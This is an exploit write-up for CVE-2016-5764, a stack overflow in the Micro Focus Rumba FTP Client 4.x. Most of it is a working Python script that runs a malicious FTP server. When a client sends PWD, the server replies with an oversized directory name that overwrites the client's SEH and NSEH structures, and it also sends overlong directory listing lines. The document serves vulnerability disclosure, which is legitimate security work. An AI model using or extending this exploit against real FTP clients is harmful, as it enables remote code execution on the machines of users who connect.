# Exploit Title: Rumba FTP 4.x Client Stackoverflow SEH
# Date: 29-10-2016
# Exploit Author: Umit Aksu
# Vendor Homepage: http://community.microfocus.com/microfocus/mainframe_solutions/rumba/w/knowledge_base/28731.rumba-ftp-4-x-security-update.aspx
# Software Link: http://nadownloads.microfocus.com/epd/product_download_request.aspx?type=eval&transid=2179441&last4=2179441&code=40307
# Version: 4.x
# Tested on: Windows 7
# CVE : CVE-2016-5764
 


1.  Description

Micro Focus Rumba FTP Client 4.x cannt handle long directory names. An attacker can setup a malicious FTP server that can send a long directory name which can led to remote code execution 
on connected client.

2. Proof of Concept

The code below can be used to setup a malicious FTP server that will send a long directory name and overwrite the stack. The PoC only overwrites the SEH + NSEH.


3. PoC Code


------------------- Server.py --------------------------


import socket
import sys
import time

# IP Address
IP = '127.0.0.1' \
     ''
# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the port
server_address = (IP,21)
print "Starting up on %s port %s" % server_address
sock.bind(server_address)

# Listen for incoming connections
sock.listen(1)

# Wait for incoming connection
while True:
    print "Waiting for a connection"
    connection, client_address = sock.accept()

    try:
        print "Connection from " + str(client_address)
        # Receive the data in small chunks and restransmit it
        connection.send("220 Welcome\r\n")

        while(True):
            data = connection.recv(16)
            print "received %s" % data
            if "USER" in data:
                print "Sending 331"
                connection.send("331 Please specify the password.\r\n")
            if "PASS" in data:
                print "Sending 227"
                connection.send("230 Login successful.\n\n")
            if "PWD" in data:
                print "Sending 257"

                # 77A632E2 add esp,908 pop pop pop ret
                # THIS IS THE PART WHERE THE OVERFLOW HAPPENS
                connection.send("257 \"/"+"A"*629+"\x45\x45\x45\x45"+ "\x44\x44\x44\x44" + "D"*185 + "rrrr" + "D"*211 + "\"\r\n")
            if "TYPE A" in data:
                print "Sending 200 Switching to ASCII mode."
                connection.send("200 Switching to ASCII mode.\r\n")
            if "TYPE I" in data:
                print "Sending 200 Switching to Binary mode."
                connection.send("200 200 Switching to Binary mode.\r\n")
            if "SYST" in data:
                print "Sending 215"
                connection.send("215 UNIX Type: L8\r\n")

            if "SIZE" in data:
                print "Sending 200"
                connection.send("200 Switching to Binary mode. \r\n")

            if "FEAT" in data:
                print "Sending 211-Features"
                connection.send("211-Features:\r\n EPRT\r\n EPSV\r\n MDTM\r\n PASV\r\n REST STREAM\r\n SIZE\r\n TVFS\r\n211 End\r\n")
            if "CWD" in data:
                print "Sending 250 Directory successfully changed."
                connection.send("250 Directory successfully changed.\r\n")

            if "PASV" in str(data):
                print "Sending 227 Entering Passive Mode (130,161,45,252,111,183)\n\n"
                connection.send("227 Entering Passive Mode (130,161,45,252,111,183)\n\n")

                # Listen on new socket for connection
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print 'Socket created'

                #Bind socket to local host and port
                try:
                    s.bind((IP, 28599))
                except socket.error as msg:
                    print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
                    sys.exit()

                print 'Socket bind complete for PASV on port 28599'

                #Start listening on socket
                s.listen(10)
                print 'Socket now listening on 28599'

                #now keep talking with the client

                #wait to accept a connection - blocking call
                conn, addr = s.accept()
                print 'Connected with ' + addr[0] + ':' + str(addr[1])
                time.sleep(1)
                print "Sending dir list"
                connection.send("150 Here comes the directory listing.\r\n")
                conn.send("d"*500+"rwx------    2 500      500          4096 Nov 05  2007 " + "A." + "B"*500 +  "\r\n")

                # Send ok to ftp client
                connection.send("226 Directory send OK.\r\n")

                # close the connection
                s.close()
                conn.close()
                break

            if "EXIT" in str(data):
                print "REC"
                connection.send("Have a nice day!\r\n")
                break
    finally:
        connection.close()